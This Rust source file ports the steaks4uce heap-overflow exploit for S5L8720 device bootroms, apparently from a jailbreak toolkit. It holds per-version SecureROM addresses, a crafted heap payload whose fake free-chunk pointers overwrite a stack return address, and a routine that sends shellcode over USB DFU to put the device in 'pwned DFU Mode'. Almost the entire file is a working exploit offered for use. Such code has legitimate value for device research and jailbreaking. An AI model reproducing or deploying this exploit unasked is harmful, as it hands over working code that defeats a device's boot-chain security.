//! Port of `steaks4uce.py`: the heap overflow that pwns S5L8720 devices.
//! Credit: pod2g.

use std::thread::sleep;
use std::time::Duration;

use crate::dfu;
use crate::libusb;
use crate::shellcode::{self, Arch};
use crate::utilities::die;

const CONSTANTS_240_4: &[u32] = &[
    0x2203_0000, //  1 - MAIN_STACK_ADDRESS
    0x3af5,      //  2 - nor_power_on
    0x486d,      //  3 - nor_init
    0x6c81,      //  4 - usb_destroy
    0x1059,      //  5 - usb_shutdown
    0x560,       //  6 - invalidate_instruction_cache
    0x2202_d800, //  7 - RELOCATE_SHELLCODE_ADDRESS
    0x200,       //  8 - RELOCATE_SHELLCODE_SIZE
    0x795c,      //  9 - memmove
    0x534,       // 10 - clean_data_cache
    0x280,       // 11 - gVersionString
    0x83cd,      // 12 - strlcat
    0x30e9,      // 13 - usb_wait_for_image
    0x2200_0000, // 14 - LOAD_ADDRESS
    0x24000,     // 15 - MAX_SIZE
    0x2202_41ac, // 16 - gLeakingDFUBuffer
    0x1955,      // 17 - free
    0x6578_6563, // 18 - EXEC_MAGIC
    0x1bf1,      // 19 - memz_create
    0x3339,      // 20 - jump_to
    0x1c19,      // 21 - memz_destroy
    0x58,        // 22 - IMAGE3_LOAD_SP_OFFSET
    0x54,        // 23 - IMAGE3_LOAD_STRUCT_OFFSET
    0x1c5d,      // 24 - image3_create_struct
    0x22cd,      // 25 - image3_load_continue
    0x23a3,      // 26 - image3_load_fail
];

const CONSTANTS_240_5_1: &[u32] = &[
    0x2203_0000,
    0x3afd,
    0x4875,
    0x6c89,
    0x1059,
    0x560,
    0x2202_d800,
    0x200,
    0x7964,
    0x534,
    0x280,
    0x83d5,
    0x30f1,
    0x2200_0000,
    0x24000,
    0x2202_41ac,
    0x1955,
    0x6578_6563,
    0x1bf9,
    0x3341,
    0x1c21,
    0x58,
    0x54,
    0x1c65,
    0x22d5,
    0x23ab,
];

struct DeviceConfig {
    version: &'static str,
    constants: &'static [u32],
}

static CONFIGS: &[DeviceConfig] = &[
    // S5L8720 (old bootrom)
    DeviceConfig {
        version: "240.4",
        constants: CONSTANTS_240_4,
    },
    // S5L8720 (new bootrom)
    DeviceConfig {
        version: "240.5.1",
        constants: CONSTANTS_240_5_1,
    },
];

/// Heap data used to overwrite the overwrite buffer (padded to 256 bytes first).
fn overwrite_payload() -> Vec<u8> {
    let mut payload = vec![0u8; 256];
    for value in [
        // 1. Allocated chunk to be freed.
        // Chunk header: (size 0x8)
        0x84u32, //   0x00: previous_chunk
        0x5,     //   0x04: next_chunk
        // Contents: (requested size 0x1c, allocated size 0x20)
        0x80,        //   0x08: buffer[0] - direction
        0x2202_6280, //   0x0c: buffer[1] - usb_response_buffer
        0xffff_ffff, //   0x10: buffer[2]
        0x138,       //   0x14: buffer[3] - size of payload in bytes
        0x100,       //   0x18: buffer[4]
        0x0,         //   0x1c: buffer[5]
        0x0,         //   0x20: buffer[6]
        0x0,         //   0x24: unused
        // 2. Fake free chunk.
        // Chunk header: (size 0x8)
        0x15, //   0x28: previous_chunk
        0x2,  //   0x2c: next_chunk
        // Attack fd/bk pointers in this free chunk for arbitrary write.
        0x2200_0001, //   0x30: fd - shellcode_address (what to write)
        0x2202_d7fc, //   0x34: bk - exception_irq() LR on the stack (where to write)
    ] {
        payload.extend_from_slice(&value.to_le_bytes());
    }
    payload
}

/// `steaks4uce.generate_shellcode`
fn generate_shellcode(constants: &[u32]) -> Vec<u8> {
    let widened: Vec<u64> = constants.iter().map(|c| *c as u64).collect();
    shellcode::prepare_shellcode(shellcode::STEAKS4UCE, Arch::Armv7, &widened)
}

/// `steaks4uce.exploit`
pub fn exploit() {
    println!("*** based on steaks4uce exploit (heap overflow) by pod2g ***");

    let device = dfu::acquire_device();
    println!("Found: {}", device.serial_number);
    let serial_number = device.serial_number.clone();

    if serial_number.contains("PWND:[") {
        println!("Device is already in pwned DFU Mode. Not executing exploit.");
        return;
    }

    if !serial_number.contains("CPID:8720") {
        die("ERROR: Not a compatible device. This exploit is for S5L8720 devices only. Exiting.");
    }

    let chosen = CONFIGS
        .iter()
        .find(|config| serial_number.contains(&format!("SRTG:[iBoot-{}]", config.version)));

    let chosen = match chosen {
        Some(config) => config,
        None => {
            println!("ERROR: CPID is compatible, but serial number string does not match.");
            println!(
                "Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting."
            );
            std::process::exit(1);
        }
    };

    let payload = overwrite_payload();

    dfu::reset_counters(&device);
    dfu::send_data(&device, &generate_shellcode(chosen.constants));
    dfu::send_data(&device, &payload);
    let status = libusb::ctrl_in(&device, 0xA1, 1, 0, 0, payload.len(), 1000);
    assert!(
        matches!(&status, Ok(v) if v.len() == payload.len()),
        "steaks4uce: expected a {} byte status response",
        payload.len()
    );
    drop(device);

    sleep(Duration::from_millis(10));

    let device = dfu::acquire_device();
    dfu::usb_reset(&device);
    drop(device);

    let device = dfu::acquire_device();
    let failed = !device.serial_number.contains("PWND:[steaks4uce]");
    drop(device);

    if failed {
        die("ERROR: Exploit failed. Device did not enter pwned DFU Mode.");
    }

    println!("Device is now in pwned DFU Mode.");
}
